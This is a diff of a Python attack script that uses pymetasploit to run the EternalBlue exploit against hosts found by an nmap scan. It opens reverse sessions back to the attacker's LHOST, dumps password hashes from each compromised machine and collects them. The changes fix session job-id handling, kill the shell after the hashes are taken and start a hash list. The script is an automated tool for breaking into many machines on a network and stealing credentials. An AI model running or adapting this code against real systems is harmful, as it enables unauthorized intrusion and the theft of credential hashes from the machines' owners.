@@ -86,9 +86,7 @@ def eternalBlue(ip, localip):
     payload['LHOST'] = localip
     # Exploit the host
     proc = exploit.execute(payload=payload)
-    jobId = proc.get('job_id')
-    if jobId == 0:
-        jobId = 1
+    jobId = proc.get('job_id') + 1 # add 1 because pymetasploit is horribly written
     timeout = 100
     count = 0
     while(jobId not in client.sessions.list.keys() and count < timeout):
@@ -107,6 +105,7 @@ def eternalBlue(ip, localip):
         if(':::' in output):
             hashes = gatherHashes(output)
             print('Gained ' + str(len(hashes)) + ' hashes from ' + str(ip) + '...')
+            shell.kill()
             return hashes
 
 def getArgs(argv):
@@ -136,6 +135,7 @@ def main():
     targets = nmScan(args['targetIp'])
     print('Found ' + str(len(targets)) + ' possibly vulnerable machines...')
     # Try to break into machines with eternal blue
+    initHashData = []
     for i in range(len(targets)):
         hashData = eternalBlue(targets[i].get('ip'), args['localIp'])
         if hashData != None:
